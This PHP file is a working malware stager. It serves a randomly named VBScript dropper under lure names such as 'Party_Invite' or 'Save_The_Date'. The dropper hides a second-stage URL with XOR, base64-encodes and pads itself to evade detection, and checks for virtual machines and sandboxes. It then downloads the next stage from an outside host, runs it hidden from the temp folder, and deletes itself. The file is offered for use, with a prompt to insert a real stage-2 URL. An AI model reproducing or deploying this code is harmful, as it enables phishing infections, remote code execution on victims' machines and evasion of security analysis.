<?php
// stage1.php - Fully protected Stager (XOR URL + Encoding + Random name + Varying size)
header('Content-Type: text/plain; charset=utf-8');
header('Cache-Control: no-store, no-cache, must-revalidate');

$baseNames = [
    "Party_Invite", "Letter_from_Friend", "Important_Mail", "Formal_Invitation",
    "Invitation_Final", "Special_Invitation_VIP", "Special_letter_VIP",
    "Ceremony_Invite", "RSVP_Invitation_Draft", "Personal_Invite", "Elegant_Invitation_Card",
    "Invitation_Exclusive", "Save_The_Date_Invitation", "Save_The_Date"
];

$cookieName = "stage1_used";
$used = isset($_COOKIE[$cookieName]) ? json_decode($_COOKIE[$cookieName], true) : [];
if (!is_array($used)) $used = [];

$available = array_diff($baseNames, $used);
if (empty($available)) {
    $available = $baseNames;
    $used = [];
}

$chosenBase = $available[array_rand($available)];
$random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);
$chosen = $chosenBase . "_" . $random5 . ".vbs";

$used[] = $chosenBase;
setcookie($cookieName, json_encode(array_unique($used)), time() + (30 * 24 * 60 * 60), "/");

header('Content-Disposition: attachment; filename="' . $chosen . '"');

// ===== CHANGE THIS to your real Stage 2 URL =====
$stage2Url = "http://walrus-app-f8pss.ondigitalocean.app/stage2.php";

// ===== Generate XOR arrays =====
$key = [];
$cipher = [];
$urlLen = strlen($stage2Url);

for ($i = 0; $i < $urlLen; $i++) {
    $k = rand(1, 255);
    $key[] = $k;
    $cipher[] = ord($stage2Url[$i]) ^ $k;
}

function formatArray($arr) {
    $lines = [];
    $chunks = array_chunk($arr, 10);
    foreach ($chunks as $chunk) {
        $hex = array_map(function($v) {
            return "&H" . strtoupper(str_pad(dechex($v), 2, "0", STR_PAD_LEFT));
        }, $chunk);
        $lines[] = "  " . implode(",", $hex);
    }
    return implode(", _\r\n", $lines);
}

$keyFormatted    = formatArray($key);
$cipherFormatted = formatArray($cipher);

// ===== Random junk =====
$junkLines = rand(6, 25);
$junk = "";
for ($i = 0; $i < $junkLines; $i++) {
    $junk .= "' Junk " . bin2hex(random_bytes(rand(5, 14))) . "\r\n";
}

$realVbs = <<<REAL
On Error Resume Next

Dim svc, score, objShell, objFSO, http, stream, stage2, tempFile, mefinuwig, harogilim, i
score = 0

Set svc = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2")
If Err.Number <> 0 Then WScript.Quit

Function ContainsAny(value, needles)
    Dim n
    value = LCase(CStr(value))
    For Each n In needles
        If InStr(value, LCase(CStr(n))) > 0 Then
            ContainsAny = True
            Exit Function
        End If
    Next
    ContainsAny = False
End Function

Dim item, textValue, count

For Each item In svc.ExecQuery("SELECT Manufacturer, Model FROM Win32_ComputerSystem")
    textValue = CStr(item.Manufacturer) & " " & CStr(item.Model)
    If ContainsAny(textValue, Array("vmware","virtualbox","virtual machine","kvm","qemu","xen","parallels","hyper-v")) Then score = score + 3
Next

For Each item In svc.ExecQuery("SELECT Manufacturer, SMBIOSBIOSVersion FROM Win32_BIOS")
    textValue = CStr(item.Manufacturer) & " " & CStr(item.SMBIOSBIOSVersion)
    If ContainsAny(textValue, Array("vmware","virtualbox","vbox","qemu","xen","parallels","hyper-v")) Then score = score + 3
Next

count = 0
For Each item In svc.ExecQuery("SELECT Name FROM Win32_Process")
    count = count + 1
Next
If count < 35 Then score = score + 1

If score >= 3 Then
    WScript.Sleep 1800000
    WScript.Quit
End If

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' ===== Reconstruct Stage 2 URL =====
mefinuwig = Array( _
$keyFormatted )
harogilim = Array( _
$cipherFormatted )
stage2 = ""
For i = 0 To UBound(harogilim)
  stage2 = stage2 & Chr(harogilim(i) Xor mefinuwig(i))
Next

tempFile = objShell.ExpandEnvironmentStrings("%TEMP%") & "\\update_" & Int(Rnd * 99999) & ".vbs"

Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", stage2, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.responseBody
    stream.SaveToFile tempFile, 2
    stream.Close

    objShell.Run "wscript.exe """ & tempFile & """", 0, False
End If

objFSO.DeleteFile WScript.ScriptFullName, True

$junk
WScript.Quit
REAL;

// ===== Base64 Chunk Encoding =====
$chunkSize = 90;
$base64 = base64_encode($realVbs);
$len = strlen($base64);
$count = ceil($len / $chunkSize);

$vbs = "Option Explicit\r\n";
$vbs .= "Dim vuliri(" . ($count - 1) . ")\r\n";

for ($i = 0; $i < $count; $i++) {
    $start = $i * $chunkSize;
    $chunk = substr($base64, $start, $chunkSize);
    $vbs .= "vuliri($i) = \"$chunk\"\r\n";
}

$vbs .= "\r\nDim ojofofi : ojofofi = Join(vuliri, \"\")\r\n";
$vbs .= "ExecuteGlobal ahokehuho(ojofofi)\r\n\r\n";
$vbs .= "Function ahokehuho(s)\r\n";
$vbs .= " Dim cihozot, alemi, nd\r\n";
$vbs .= " Set cihozot = CreateObject(\"Msxml2.DOMDocument.6.0\")\r\n";
$vbs .= " Set nd = cihozot.createElement(\"b\")\r\n";
$vbs .= " nd.dataType = \"bin.base64\"\r\n";
$vbs .= " nd.text = s\r\n";
$vbs .= " Set alemi = CreateObject(\"ADODB.Stream\")\r\n";
$vbs .= " alemi.Type = 1 : alemi.Open\r\n";
$vbs .= " alemi.Write nd.nodeTypedValue\r\n";
$vbs .= " alemi.Position = 0\r\n";
$vbs .= " alemi.Type = 2 : alemi.Charset = \"UTF-8\"\r\n";
$vbs .= " ahokehuho = alemi.ReadText\r\n";
$vbs .= " alemi.Close\r\n";
$vbs .= "End Function\r\n";

echo $vbs;
?>
